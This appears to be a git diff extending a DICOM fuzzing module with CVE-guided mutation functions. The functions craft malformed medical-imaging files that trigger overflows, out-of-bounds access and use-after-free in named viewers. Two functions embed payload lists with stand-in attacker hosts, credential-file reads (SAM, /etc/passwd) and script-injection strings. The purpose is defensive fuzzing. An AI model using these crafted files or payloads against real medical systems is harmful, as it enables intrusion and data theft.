@@ -1,20 +1,48 @@
 """CVE-Inspired Mutation Strategies.
 
-Mutation strategies based on known DICOM vulnerabilities and CVEs.
-These target specific vulnerability patterns found in real-world DICOM parsers.
+Vulnerability-guided fuzzing (Directed Greybox Fuzzing) for DICOM parsers.
 
-CVEs Covered:
+These mutations generate malformed DICOM test files based on known CVE patterns.
+This is FUZZING, not penetration testing:
+- Fuzzing: "Does my parser have similar bugs?" (generates test cases)
+- Pentesting: "Can I exploit this CVE?" (attacks running systems)
+
+The CVE patterns guide the fuzzer toward known vulnerability classes, making it
+more effective at finding similar bugs in YOUR software. This approach is
+recommended by FDA guidance (2025) for medical device security testing.
+
+CVEs Covered (26 total mutations across 20 CVEs):
+
+2025 CVEs:
 - CVE-2025-5943: MicroDicom heap buffer overflow in pixel data parsing
+- CVE-2025-35975: MicroDicom out-of-bounds write (June 2025)
 - CVE-2025-11266: GDCM out-of-bounds write in encapsulated PixelData fragments
 - CVE-2025-53618: GDCM JPEG codec out-of-bounds read (info leak)
 - CVE-2025-53619: GDCM JPEG codec out-of-bounds read
+- CVE-2025-1001: RadiAnt DICOM Viewer certificate validation bypass (MITM)
+- CVE-2025-27578: OsiriX MD use-after-free via DICOM upload
+- CVE-2025-31946: OsiriX MD local use-after-free via DICOM import
+- CVE-2025-5307: Sante DICOM Viewer Pro out-of-bounds read
+
+2024 CVEs:
+- CVE-2024-22100: MicroDicom heap-based buffer overflow
+- CVE-2024-25578: MicroDicom out-of-bounds write (lack of validation)
+- CVE-2024-28877: MicroDicom stack-based buffer overflow
+- CVE-2024-33606: MicroDicom URL scheme bypass
+- CVE-2024-1453: Sante DICOM Viewer Pro out-of-bounds read
+- CVE-2024-47796: DCMTK out-of-bounds write in nowindow LUT (TALOS-2024-2122)
+- CVE-2024-52333: DCMTK out-of-bounds write in determineMinMax (TALOS-2024-2121)
+
+Legacy CVEs:
 - CVE-2019-11687: DICOM preamble polyglot (PE/DICOM, ELF/DICOM)
 - CVE-2020-29625: DCMTK denial of service via malformed length fields
 - CVE-2021-41946: ClearCanvas path traversal via filename injection
 - CVE-2022-24193: OsiriX denial of service via deep nesting
 
 References:
-- CISA ICS-CERT Medical Advisories (ICSMA-25-160-01, ICSMA-25-345-01)
+- CISA ICS-CERT Medical Advisories (ICSMA-24-058-01, ICSMA-24-060-01,
+  ICSMA-25-037-01, ICSMA-25-051-01, ICSMA-25-128-01, ICSMA-25-160-01,
+  ICSMA-25-345-01)
 - NIST NVD DICOM entries
 - OWASP Medical Device Security
 
@@ -33,9 +61,13 @@ class CVECategory(Enum):
     """Categories of CVE-inspired mutations."""
 
     HEAP_OVERFLOW = "heap_overflow"
+    STACK_OVERFLOW = "stack_overflow"
     BUFFER_OVERFLOW = "buffer_overflow"
     INTEGER_OVERFLOW = "integer_overflow"
     INTEGER_UNDERFLOW = "integer_underflow"
+    OUT_OF_BOUNDS_WRITE = "out_of_bounds_write"
+    OUT_OF_BOUNDS_READ = "out_of_bounds_read"
+    USE_AFTER_FREE = "use_after_free"
     PATH_TRAVERSAL = "path_traversal"
     DENIAL_OF_SERVICE = "denial_of_service"
     POLYGLOT = "polyglot"
@@ -43,7 +75,8 @@ class CVECategory(Enum):
     MALFORMED_LENGTH = "malformed_length"
     ENCAPSULATED_PIXEL = "encapsulated_pixel"
     JPEG_CODEC = "jpeg_codec"
-    OUT_OF_BOUNDS_READ = "out_of_bounds_read"
+    CERTIFICATE_VALIDATION = "certificate_validation"
+    URL_SCHEME_BYPASS = "url_scheme_bypass"
 
 
 @dataclass
@@ -568,6 +601,721 @@ def mutate_jpeg_truncated_stream(data: bytes) -> bytes:
     return bytes(result)
 
 
+# CVE-2025-35975: MicroDicom Out-of-Bounds Write (June 2025)
+# CISA Advisory: ICSMA-25-160-01
+# CVSS: 8.4 (High)
+
+
+def mutate_oob_write_pixel_data(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2025-35975 out-of-bounds write.
+
+    MicroDicom DICOM Viewer vulnerability:
+    - Out-of-bounds write due to insufficient validation of user-supplied data
+    - Exploitable via malicious DCM file
+    - Can allow arbitrary code execution
+
+    Attack vector: Malformed pixel data with specific dimension/size mismatches.
+    """
+    result = bytearray(data)
+
+    # Target specific dimension combinations that trigger OOB write
+    # The vulnerability occurs when calculated buffer size differs from actual
+    oob_triggers = [
+        # (rows, cols, bits_allocated) - combinations that cause OOB
+        (1, 0xFFFE, 16),  # Near-max columns with minimal rows
+        (0xFFFE, 1, 16),  # Near-max rows with minimal columns
+        (256, 256, 32),  # Large bits allocated
+        (512, 512, 24),  # 24-bit (unusual) allocation
+    ]
+
+    rows, cols, bits = random.choice(oob_triggers)
+
+    # Modify Rows (0028,0010)
+    rows_tag = b"\x28\x00\x10\x00"
+    idx = data.find(rows_tag)
+    if idx != -1 and idx + 8 < len(result):
+        result[idx + 6 : idx + 8] = struct.pack("<H", rows)
+
+    # Modify Columns (0028,0011)
+    cols_tag = b"\x28\x00\x11\x00"
+    idx = data.find(cols_tag)
+    if idx != -1 and idx + 8 < len(result):
+        result[idx + 6 : idx + 8] = struct.pack("<H", cols)
+
+    # Modify BitsAllocated (0028,0100)
+    bits_tag = b"\x28\x00\x00\x01"
+    idx = data.find(bits_tag)
+    if idx != -1 and idx + 8 < len(result):
+        result[idx + 6 : idx + 8] = struct.pack("<H", bits)
+
+    # Add undersized PixelData to trigger the write beyond bounds
+    pixel_data_tag = b"\xe0\x7f\x10\x00"
+    idx = data.find(pixel_data_tag)
+    if idx != -1 and idx + 8 < len(result):
+        # Set a small PixelData length that doesn't match dimensions
+        if idx + 12 < len(result):
+            result[idx + 8 : idx + 12] = struct.pack("<I", 64)  # Only 64 bytes
+
+    return bytes(result)
+
+
+# CVE-2024-25578: MicroDicom Out-of-Bounds Write (2024)
+# CISA Advisory: ICSMA-24-060-01
+# CVSS: 7.8 (High)
+
+
+def mutate_oob_write_lack_validation(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2024-25578 out-of-bounds write.
+
+    MicroDicom vulnerability due to lack of proper validation:
+    - Memory corruption within the application
+    - Triggered by malformed DCM file
+
+    Attack vector: Malformed element lengths and value representations.
+    """
+    result = bytearray(data)
+
+    # Find explicit VR elements and corrupt their lengths
+    explicit_vrs = [b"OB", b"OW", b"OF", b"OD", b"SQ", b"UN", b"UC", b"UR", b"UT"]
+
+    mutations_applied = 0
+    for vr in explicit_vrs:
+        idx = 0
+        while mutations_applied < 3:  # Limit mutations per file
+            idx = result.find(vr, idx)
+            if idx == -1:
+                break
+
+            # Check if this looks like a valid VR position (after 4-byte tag)
+            if idx >= 4 and idx + 8 < len(result):
+                # For OB/OW/OF/OD/SQ/UN/UC/UR/UT, length is at offset +4 (4 bytes)
+                length_offset = idx + 4
+                if length_offset + 4 < len(result):
+                    # Set length to a value that causes OOB write
+                    if random.random() < 0.5:
+                        # Length pointing past end of file
+                        result[length_offset : length_offset + 4] = struct.pack(
+                            "<I", len(result) * 2
+                        )
+                        mutations_applied += 1
+
+            idx += 1
+
+    return bytes(result)
+
+
+# CVE-2024-22100: MicroDicom Heap-Based Buffer Overflow
+# CISA Advisory: ICSMA-24-060-01
+# CVSS: 7.8 (High)
+
+
+def mutate_heap_overflow_dcm_parsing(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2024-22100 heap buffer overflow.
+
+    MicroDicom heap-based buffer overflow:
+    - Exploitable by opening malicious DCM file
+    - Allows remote code execution
+    - Low complexity attack
+
+    Attack vector: Specific combinations of DICOM elements that overflow heap.
+    """
+    result = bytearray(data)
+
+    # Target Private Creator elements which are often parsed into fixed buffers
+    private_creator_tag = b"\x09\x00\x10\x00"  # (0009,0010) Private Creator
+    idx = data.find(private_creator_tag)
+
+    if idx == -1:
+        # Inject a private creator with overflow payload
+        # Insert after file meta header (after first 132 bytes typically)
+        insert_pos = min(200, len(result) - 4)
+
+        # Create oversized private creator element
+        overflow_payload = (
+            private_creator_tag
+            + b"LO"  # VR
+            + struct.pack("<H", 0xFFFF)  # Max length
+            + b"A" * 256  # Overflow data
+        )
+        result = result[:insert_pos] + overflow_payload + result[insert_pos:]
+    else:
+        # Modify existing private creator length
+        if idx + 8 < len(result):
+            result[idx + 6 : idx + 8] = struct.pack("<H", 0xFFFF)
+
+    # Also target SOP Instance UID for additional overflow vector
+    sop_uid_tag = b"\x08\x00\x18\x00"  # (0008,0018)
+    idx = data.find(sop_uid_tag)
+    if idx != -1 and idx + 8 < len(result):
+        # Set oversized length
+        result[idx + 6 : idx + 8] = struct.pack("<H", 512)
+
+    return bytes(result)
+
+
+# CVE-2024-28877: MicroDicom Stack-Based Buffer Overflow
+# CISA Advisory: ICSMA-24-060-01
+# CVSS: 8.7 (High)
+
+
+def mutate_stack_overflow_dcm(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2024-28877 stack buffer overflow.
+
+    MicroDicom stack-based buffer overflow:
+    - User interaction required (open malicious file)
+    - Allows arbitrary code execution
+    - Affects version 2023.3 and prior
+
+    Attack vector: Deeply nested structures or oversized string elements.
+    """
+    result = bytearray(data)
+
+    # Stack overflows often triggered by:
+    # 1. Recursive parsing of deeply nested sequences
+    # 2. Large string values copied to stack buffers
+
+    # Create deeply nested sequence that may overflow stack
+    nesting_depth = random.randint(200, 1000)
+
+    item_start = b"\xfe\xff\x00\xe0"  # Item
+    item_end = b"\xfe\xff\x0d\xe0"  # Item Delimitation
+    sq_start = b"\x08\x00\x15\x11"  # Referenced Series Sequence
+
+    # Build recursive sequence structure
+    nested = b""
+    for _ in range(nesting_depth):
+        nested = (
+            sq_start
+            + b"SQ\x00\x00"
+            + b"\xff\xff\xff\xff"  # Undefined length
+            + item_start
+            + b"\xff\xff\xff\xff"
+            + nested
+            + item_end
+            + b"\x00\x00\x00\x00"
+            + b"\xfe\xff\xdd\xe0"  # Sequence delimitation
+            + b"\x00\x00\x00\x00"
+        )
+
+    # Also inject oversized Patient Name (stack buffer target)
+    patient_name_tag = b"\x10\x00\x10\x00"  # (0010,0010)
+    idx = data.find(patient_name_tag)
+    if idx != -1 and idx + 8 < len(result):
+        # Set length to trigger stack copy overflow
+        result[idx + 6 : idx + 8] = struct.pack("<H", 4096)
+        # Pad with overflow data
+        overflow_data = b"A" * 4096
+        result = result[: idx + 8] + overflow_data + result[idx + 8 :]
+
+    # Append nested structure
+    result = result[:-4] + nested + result[-4:]
+
+    return bytes(result)
+
+
+# CVE-2024-33606: MicroDicom URL Scheme Bypass
+# CISA Advisory: ICSMA-24-060-01
+# CVSS: 8.8 (High)
+
+
+def mutate_url_scheme_bypass(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2024-33606 URL scheme bypass.
+
+    MicroDicom URL scheme vulnerability:
+    - Bypass of security restrictions via crafted URLs in DICOM elements
+    - Can lead to arbitrary file access or code execution
+
+    Attack vector: Malicious URLs in Retrieve URL or similar elements.
+    """
+    result = bytearray(data)
+
+    # Malicious URL payloads for various bypass techniques
+    url_payloads = [
+        b"file:///C:/Windows/System32/config/SAM",
+        b"file://localhost/etc/passwd",
+        b"\\\\attacker.com\\share\\payload.exe",
+        b"http://127.0.0.1:8080/../../etc/passwd",
+        b"javascript:alert(1)",  # If rendered in web view
+        b"data:text/html,<script>alert(1)</script>",
+        b"file:///proc/self/environ",
+        b"dict://attacker:11111/",
+        b"gopher://attacker:70/_",
+        b"ldap://attacker/exploit",
+    ]
+
+    payload = random.choice(url_payloads)
+
+    # Target Retrieve URL (0008,1190) or Retrieve URI (0040,E010)
+    retrieve_url_tag = b"\x08\x00\x90\x11"  # (0008,1190) Retrieve URL
+    retrieve_uri_tag = b"\x40\x00\x10\xe0"  # (0040,E010) Retrieve URI
+
+    # Try to find and modify existing URL element
+    for tag in [retrieve_url_tag, retrieve_uri_tag]:
+        idx = data.find(tag)
+        if idx != -1 and idx + 8 < len(result):
+            result[idx + 6 : idx + 8] = struct.pack("<H", len(payload))
+            result = result[: idx + 8] + payload + result[idx + 8 + len(payload) :]
+            break
+    else:
+        # Inject new Retrieve URL element
+        insert_pos = min(300, len(result) - 4)
+        url_element = (
+            retrieve_url_tag + b"UR" + struct.pack("<H", len(payload)) + payload
+        )
+        result = result[:insert_pos] + url_element + result[insert_pos:]
+
+    return bytes(result)
+
+
+# CVE-2025-1001: RadiAnt DICOM Viewer Certificate Validation Bypass
+# CISA Advisory: ICSMA-25-051-01
+# CVSS: 5.7 (Medium)
+
+
+def mutate_certificate_validation_bypass(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2025-1001 certificate validation bypass.
+
+    RadiAnt DICOM Viewer vulnerability:
+    - Improper certificate validation in update mechanism
+    - Allows MITM attacks with malicious updates
+
+    Note: This mutation simulates the attack pattern by embedding
+    malicious update metadata in DICOM elements that could be
+    processed by viewers with similar vulnerabilities.
+
+    Attack vector: Inject update-related URLs/paths in DICOM metadata.
+    """
+    result = bytearray(data)
+
+    # Payloads that simulate malicious update redirection
+    update_payloads = [
+        b"https://attacker.com/DicomViewer_Update.exe",
+        b"http://localhost:8080/malicious_update.msi",
+        b"\\\\evil.com\\updates\\viewer.exe",
+        b"https://update.legitimate-domain.com.attacker.com/update",
+        b"https://DicomViewer.com@attacker.com/update.exe",
+    ]
+
+    payload = random.choice(update_payloads)
+
+    # Inject in Institution Address or similar text field
+    # that might be displayed or processed
+    institution_addr_tag = b"\x08\x00\x81\x00"  # (0008,0081) Institution Address
+    station_name_tag = b"\x08\x00\x10\x10"  # (0008,1010) Station Name
+
+    for tag in [institution_addr_tag, station_name_tag]:
+        idx = data.find(tag)
+        if idx != -1 and idx + 8 < len(result):
+            result[idx + 6 : idx + 8] = struct.pack("<H", len(payload))
+            result = result[: idx + 8] + payload + result[idx + 8 + len(payload) :]
+            break
+    else:
+        # Inject as Software Versions (0018,1020)
+        software_tag = b"\x18\x00\x20\x10"
+        insert_pos = min(250, len(result) - 4)
+        element = software_tag + b"LO" + struct.pack("<H", len(payload)) + payload
+        result = result[:insert_pos] + element + result[insert_pos:]
+
+    return bytes(result)
+
+
+# CVE-2025-27578: OsiriX MD Use-After-Free (Remote)
+# CISA Advisory: ICSMA-25-128-01
+# CVSS: 8.7 (High)
+
+
+def mutate_use_after_free_remote(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2025-27578 use-after-free.
+
+    OsiriX MD vulnerability:
+    - Use-after-free via crafted DICOM file upload
+    - Causes memory corruption leading to DoS
+    - Could potentially allow code execution
+
+    Attack vector: Malformed sequences with dangling references.
+    """
+    result = bytearray(data)
+
+    # Use-after-free patterns typically triggered by:
+    # 1. Sequences with invalid item counts
+    # 2. References to freed memory regions
+    # 3. Malformed encapsulated data with early termination
+
+    # Create sequence structure that may cause UAF
+    # by having mismatched item counts and early delimitation
+    sq_tag = b"\x08\x00\x15\x11"  # Referenced Series Sequence
+    item_start = b"\xfe\xff\x00\xe0"  # Item
+    item_end = b"\xfe\xff\x0d\xe0"  # Item Delimitation
+    seq_delim = b"\xfe\xff\xdd\xe0"  # Sequence Delimitation
+
+    # Create malformed sequence with premature termination
+    # Parser may allocate memory for expected items then free early
+    uaf_sequence = (
+        sq_tag
+        + b"SQ\x00\x00"
+        + b"\xff\xff\xff\xff"  # Undefined length
+        # Item 1 - valid
+        + item_start
+        + struct.pack("<I", 8)  # Length 8
+        + b"\x00" * 8
+        # Item 2 - starts but immediately ends sequence
+        + item_start
+        + b"\xff\xff\xff\xff"  # Undefined length
+        # Premature sequence end without item end
+        + seq_delim
+        + b"\x00\x00\x00\x00"
+        # More data after sequence end - may reference freed memory
+        + b"\x08\x00\x16\x00"  # (0008,0016) SOP Class UID
+        + b"UI"
+        + struct.pack("<H", 26)
+        + b"1.2.840.10008.5.1.4.1.1.2"
+        + b"\x00"
+    )
+
+    # Also corrupt existing sequences if present
+    idx = data.find(sq_tag)
+    if idx != -1:
+        # Find item delimiter and corrupt it
+        item_idx = result.find(item_end, idx)
+        if item_idx != -1:
+            # Replace item end with garbage to confuse parser
+            result[item_idx : item_idx + 4] = b"\x00\x00\x00\x00"
+
+    # Append UAF-triggering structure
+    result = result[:-4] + uaf_sequence + result[-4:]
+
+    return bytes(result)
+
+
+# CVE-2025-31946: OsiriX MD Local Use-After-Free
+# CISA Advisory: ICSMA-25-128-01
+# CVSS: 6.9 (Medium)
+
+
+def mutate_use_after_free_local(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2025-31946 local use-after-free.
+
+    OsiriX MD vulnerability:
+    - Local use-after-free via crafted DICOM import
+    - Causes memory corruption or system crash
+    - Triggered by specific PixelData/sequence patterns
+
+    Attack vector: Malformed PixelData with dangling frame references.
+    """
+    result = bytearray(data)
+
+    # Local UAF often triggered by:
+    # 1. Multi-frame images with invalid frame pointers
+    # 2. Encapsulated data with freed fragment references
+    # 3. Sequences with circular or self-referencing items
+
+    pixel_data_tag = b"\xe0\x7f\x10\x00"  # (7FE0,0010)
+    item_tag = b"\xfe\xff\x00\xe0"
+    seq_delim = b"\xfe\xff\xdd\xe0"
+
+    # Create encapsulated PixelData that may cause UAF
+    # with fragments that reference each other incorrectly
+    uaf_pixel_data = (
+        pixel_data_tag
+        + b"OW\x00\x00"
+        + b"\xff\xff\xff\xff"  # Undefined length
+        # Offset table with invalid offsets pointing to freed regions
+        + item_tag
+        + struct.pack("<I", 16)  # 4 offsets
+        + struct.pack("<I", 0)  # Offset 0 (valid)
+        + struct.pack("<I", 0xFFFFFFFF)  # Invalid offset (may cause UAF)
+        + struct.pack("<I", 0x80000000)  # Large offset
+        + struct.pack("<I", 0xDEADBEEF)  # Marker for debugging
+        # Fragment 0
+        + item_tag
+        + struct.pack("<I", 4)
+        + b"\x00\x00\x00\x00"
+        # Missing fragments - parser may try to access freed memory
+        # Premature end
+        + seq_delim
+        + b"\x00\x00\x00\x00"
+    )
+
+    # Replace existing PixelData or append
+    idx = data.find(pixel_data_tag)
+    if idx != -1:
+        # Corrupt existing PixelData length
+        if idx + 12 < len(result):
+            result[idx + 8 : idx + 12] = b"\xff\xff\xff\xff"
+    else:
+        result = result[:-4] + uaf_pixel_data + result[-4:]
+
+    return bytes(result)
+
+
+# CVE-2024-1453: Sante DICOM Viewer Pro Out-of-Bounds Read
+# CISA Advisory: ICSMA-24-058-01
+# CVSS: 7.8 (High)
+
+
+def mutate_oob_read_sante_2024(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2024-1453 out-of-bounds read.
+
+    Sante DICOM Viewer Pro vulnerability:
+    - Out-of-bounds read via malicious DICOM file
+    - Can disclose information or execute arbitrary code
+    - Affects version 14.0.3 and prior
+
+    Attack vector: Malformed elements with lengths exceeding bounds.
+    """
+    result = bytearray(data)
+
+    # OOB read triggered by:
+    # 1. Element lengths larger than actual data
+    # 2. String elements with missing null terminators
+    # 3. Numeric elements with oversized values
+
+    # Target commonly parsed elements that may cause OOB read
+    oob_targets = [
+        (b"\x08\x00\x60\x00", b"SH", 256),  # (0008,0060) Modality
+        (b"\x08\x00\x70\x00", b"LO", 512),  # (0008,0070) Manufacturer
+        (b"\x10\x00\x10\x00", b"PN", 1024),  # (0010,0010) Patient Name
+        (b"\x10\x00\x20\x00", b"LO", 512),  # (0010,0020) Patient ID
+        (b"\x20\x00\x0d\x00", b"UI", 256),  # (0020,000D) Study Instance UID
+    ]
+
+    tag, vr, length = random.choice(oob_targets)
+    idx = data.find(tag)
+
+    if idx != -1 and idx + 8 < len(result):
+        # Set length larger than remaining file
+        remaining = len(result) - idx - 8
+        oversized_length = remaining + random.randint(100, 1000)
+        result[idx + 6 : idx + 8] = struct.pack("<H", min(oversized_length, 0xFFFF))
+    else:
+        # Inject element with oversized length
+        insert_pos = min(200, len(result) - 4)
+        oversized_element = (
+            tag
+            + vr
+            + struct.pack("<H", length)  # Claim large length
+            + b"X" * min(length // 4, 64)  # But provide less data
+        )
+        result = result[:insert_pos] + oversized_element + result[insert_pos:]
+
+    return bytes(result)
+
+
+# CVE-2025-5307: Sante DICOM Viewer Pro Out-of-Bounds Read (2025)
+# CVSS: 8.4 (High)
+
+
+def mutate_oob_read_sante_2025(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2025-5307 out-of-bounds read.
+
+    Sante DICOM Viewer Pro vulnerability:
+    - Out-of-bounds read in version 14.2.1 and prior
+    - Can disclose sensitive information
+    - Potentially allows arbitrary code execution
+
+    Attack vector: Malformed pixel data dimensions with undersized buffers.
+    """
+    result = bytearray(data)
+
+    # This CVE is related to pixel data parsing with dimension mismatches
+    # Similar to other OOB reads but with specific trigger patterns
+
+    # Set up dimension/buffer size mismatch
+    rows_tag = b"\x28\x00\x10\x00"  # (0028,0010) Rows
+    cols_tag = b"\x28\x00\x11\x00"  # (0028,0011) Columns
+    samples_tag = b"\x28\x00\x02\x00"  # (0028,0002) Samples per Pixel
+    bits_tag = b"\x28\x00\x00\x01"  # (0028,0100) Bits Allocated
+
+    # Set dimensions that will cause read beyond allocated buffer
+    oob_dimensions = [
+        (4096, 4096, 3, 16),  # Large RGB 16-bit
+        (8192, 1, 1, 16),  # Very wide single row
+        (1, 8192, 1, 16),  # Very tall single column
+        (2048, 2048, 4, 8),  # RGBA 8-bit
+    ]
+
+    rows, cols, samples, bits = random.choice(oob_dimensions)
+
+    # Modify dimensions if tags exist
+    for tag, value in [
+        (rows_tag, rows),
+        (cols_tag, cols),
+        (samples_tag, samples),
+        (bits_tag, bits),
+    ]:
+        idx = data.find(tag)
+        if idx != -1 and idx + 8 < len(result):
+            result[idx + 6 : idx + 8] = struct.pack("<H", value)
+
+    # Set PixelData to small size to trigger OOB read
+    pixel_data_tag = b"\xe0\x7f\x10\x00"
+    idx = data.find(pixel_data_tag)
+    if idx != -1 and idx + 12 < len(result):
+        # Set very small pixel data length
+        result[idx + 8 : idx + 12] = struct.pack("<I", 64)
+
+    return bytes(result)
+
+
+# CVE-2024-47796: DCMTK Out-of-Bounds Write in nowindow LUT processing
+# Cisco Talos: TALOS-2024-2122
+# CVSS: 8.4 (High)
+
+
+def mutate_dcmtk_nowindow_oob_write(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2024-47796 out-of-bounds write.
+
+    DCMTK vulnerability in nowindow functionality:
+    - Improper array index validation in LUT (look-up table) processing
+    - OOB write when pixel count stored doesn't match expected count
+    - Affects dcmimgle library rendering invalid monochrome DICOM images
+
+    Attack vector: Mismatched pixel counts with LUT pointer manipulation.
+    Reference: https://talosintelligence.com/vulnerability_reports/TALOS-2024-2122
+    """
+    result = bytearray(data)
+
+    # The vulnerability occurs in nowindow LUT processing when:
+    # 1. NumberOfFrames * Rows * Columns doesn't match actual pixel data
+    # 2. LUT array indices are not properly validated
+
+    rows_tag = b"\x28\x00\x10\x00"  # (0028,0010) Rows
+    cols_tag = b"\x28\x00\x11\x00"  # (0028,0011) Columns
+    frames_tag = b"\x28\x00\x08\x00"  # (0028,0008) Number of Frames
+    high_bit_tag = b"\x28\x00\x02\x01"  # (0028,0102) High Bit
+    bits_stored_tag = b"\x28\x00\x01\x01"  # (0028,0101) Bits Stored
+
+    # Trigger patterns that cause LUT index overflow
+    # These create mismatches between declared dimensions and actual data
+    lut_overflow_patterns = [
+        # (rows, cols, frames, high_bit, bits_stored)
+        (0xFFFF, 1, 1, 15, 16),  # Max rows with minimal data
+        (1, 0xFFFF, 1, 15, 16),  # Max columns with minimal data
+        (256, 256, 0xFF, 15, 16),  # Many frames
+        (512, 512, 1, 31, 32),  # 32-bit with large dimensions
+        (1024, 1024, 1, 11, 12),  # 12-bit unusual configuration
+    ]
+
+    rows, cols, frames, high_bit, bits_stored = random.choice(lut_overflow_patterns)
+
+    # Modify dimension tags if they exist
+    for tag, value in [
+        (rows_tag, rows),
+        (cols_tag, cols),
+        (high_bit_tag, high_bit),
+        (bits_stored_tag, bits_stored),
+    ]:
+        idx = data.find(tag)
+        if idx != -1 and idx + 8 < len(result):
+            result[idx + 6 : idx + 8] = struct.pack("<H", value)
+
+    # Handle Number of Frames (IS VR - integer string)
+    frames_idx = data.find(frames_tag)
+    if frames_idx != -1 and frames_idx + 8 < len(result):
+        # Replace with string representation
+        frames_str = str(frames).encode()
+        # Pad to even length
+        if len(frames_str) % 2:
+            frames_str += b" "
+        result[frames_idx + 6 : frames_idx + 8] = struct.pack("<H", len(frames_str))
+        # Insert frames value (may corrupt following data - intentional for fuzzing)
+    else:
+        # Inject Number of Frames element
+        insert_pos = min(300, len(result) - 4)
+        frames_str = str(frames).encode()
+        if len(frames_str) % 2:
+            frames_str += b" "
+        frames_element = (
+            frames_tag + b"IS" + struct.pack("<H", len(frames_str)) + frames_str
+        )
+        result = result[:insert_pos] + frames_element + result[insert_pos:]
+
+    # Set PixelData to size that doesn't match calculated dimensions
+    # This triggers the LUT index overflow
+    pixel_data_tag = b"\xe0\x7f\x10\x00"
+    idx = data.find(pixel_data_tag)
+    if idx != -1 and idx + 12 < len(result):
+        # Set to small size that doesn't match rows*cols*frames*bytes_per_pixel
+        result[idx + 8 : idx + 12] = struct.pack("<I", 128)
+
+    return bytes(result)
+
+
+# CVE-2024-52333: DCMTK Out-of-Bounds Write in determineMinMax
+# Cisco Talos: TALOS-2024-2121
+# CVSS: 8.4 (High)
+
+
+def mutate_dcmtk_determine_minmax_oob(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2024-52333 out-of-bounds write.
+
+    DCMTK vulnerability in determineMinMax functionality:
+    - Improper array index validation in DiInputPixelTemplate
+    - OOB write when processing pixel data with mismatched dimensions
+    - Heap buffer overflow in dcmimgle/diinpxt.h
+
+    Attack vector: Pixel data dimensions that cause array bounds violation.
+    Reference: https://talosintelligence.com/vulnerability_reports/TALOS-2024-2121
+    """
+    result = bytearray(data)
+
+    # The vulnerability is in DiInputPixelTemplate::determineMinMax()
+    # It occurs when pixel array bounds are not validated during min/max calculation
+    # The issue manifests when actual pixel count differs from expected
+
+    rows_tag = b"\x28\x00\x10\x00"  # (0028,0010) Rows
+    cols_tag = b"\x28\x00\x11\x00"  # (0028,0011) Columns
+    samples_tag = b"\x28\x00\x02\x00"  # (0028,0002) Samples per Pixel
+    bits_alloc_tag = b"\x28\x00\x00\x01"  # (0028,0100) Bits Allocated
+    planar_tag = b"\x28\x00\x06\x00"  # (0028,0006) Planar Configuration
+
+    # Trigger patterns for determineMinMax overflow
+    # These cause the min/max loop to read/write beyond buffer
+    minmax_overflow_patterns = [
+        # (rows, cols, samples, bits_allocated, planar_config)
+        (0xFFFE, 2, 1, 16, 0),  # Near-max rows, triggers unsigned overflow
+        (2, 0xFFFE, 1, 16, 0),  # Near-max columns
+        (1000, 1000, 3, 8, 1),  # RGB planar with large dims
+        (2048, 2048, 1, 8, 0),  # Large monochrome 8-bit
+        (256, 256, 4, 16, 0),  # RGBA 16-bit
+    ]
+
+    rows, cols, samples, bits, planar = random.choice(minmax_overflow_patterns)
+
+    # Modify tags if they exist
+    for tag, value in [
+        (rows_tag, rows),
+        (cols_tag, cols),
+        (samples_tag, samples),
+        (bits_alloc_tag, bits),
+        (planar_tag, planar),
+    ]:
+        idx = data.find(tag)
+        if idx != -1 and idx + 8 < len(result):
+            result[idx + 6 : idx + 8] = struct.pack("<H", value)
+
+    # Key to triggering: PixelData size much smaller than expected
+    # Expected size: rows * cols * samples * (bits/8)
+    # Actual size: small value that causes OOB when iterating
+    pixel_data_tag = b"\xe0\x7f\x10\x00"
+    idx = data.find(pixel_data_tag)
+    if idx != -1 and idx + 12 < len(result):
+        # Set to intentionally small size
+        result[idx + 8 : idx + 12] = struct.pack("<I", 64)
+    else:
+        # Inject minimal PixelData
+        pixel_element = (
+            pixel_data_tag
+            + b"OW"
+            + b"\x00\x00"  # Reserved
+            + struct.pack("<I", 64)  # Small length
+            + b"\x00" * 64  # Minimal data
+        )
+        result = result[:-4] + pixel_element + result[-4:]
+
+    return bytes(result)
+
+
 # Registry of all CVE mutations
 
 CVE_MUTATIONS: list[CVEMutation] = [
@@ -676,6 +1424,114 @@ CVE_MUTATIONS: list[CVEMutation] = [
         mutation_func="mutate_jpeg_truncated_stream",
         severity="high",
         target_component="jpeg_codec",
+    ),
+    # CVE-2025-35975: MicroDicom Out-of-Bounds Write (June 2025)
+    CVEMutation(
+        cve_id="CVE-2025-35975",
+        category=CVECategory.OUT_OF_BOUNDS_WRITE,
+        description="MicroDicom OOB write via malformed pixel data dimensions",
+        mutation_func="mutate_oob_write_pixel_data",
+        severity="high",
+        target_component="pixel_data",
+    ),
+    # CVE-2024-25578: MicroDicom Out-of-Bounds Write
+    CVEMutation(
+        cve_id="CVE-2024-25578",
+        category=CVECategory.OUT_OF_BOUNDS_WRITE,
+        description="MicroDicom OOB write due to lack of validation",
+        mutation_func="mutate_oob_write_lack_validation",
+        severity="high",
+        target_component="vr_length",
+    ),
+    # CVE-2024-22100: MicroDicom Heap-Based Buffer Overflow
+    CVEMutation(
+        cve_id="CVE-2024-22100",
+        category=CVECategory.HEAP_OVERFLOW,
+        description="MicroDicom heap overflow in DCM parsing",
+        mutation_func="mutate_heap_overflow_dcm_parsing",
+        severity="high",
+        target_component="private_elements",
+    ),
+    # CVE-2024-28877: MicroDicom Stack-Based Buffer Overflow
+    CVEMutation(
+        cve_id="CVE-2024-28877",
+        category=CVECategory.STACK_OVERFLOW,
+        description="MicroDicom stack overflow via nested sequences",
+        mutation_func="mutate_stack_overflow_dcm",
+        severity="high",
+        target_component="sequence",
+    ),
+    # CVE-2024-33606: MicroDicom URL Scheme Bypass
+    CVEMutation(
+        cve_id="CVE-2024-33606",
+        category=CVECategory.URL_SCHEME_BYPASS,
+        description="MicroDicom URL scheme bypass for arbitrary file access",
+        mutation_func="mutate_url_scheme_bypass",
+        severity="high",
+        target_component="retrieve_url",
+    ),
+    # CVE-2025-1001: RadiAnt DICOM Viewer Certificate Validation Bypass
+    CVEMutation(
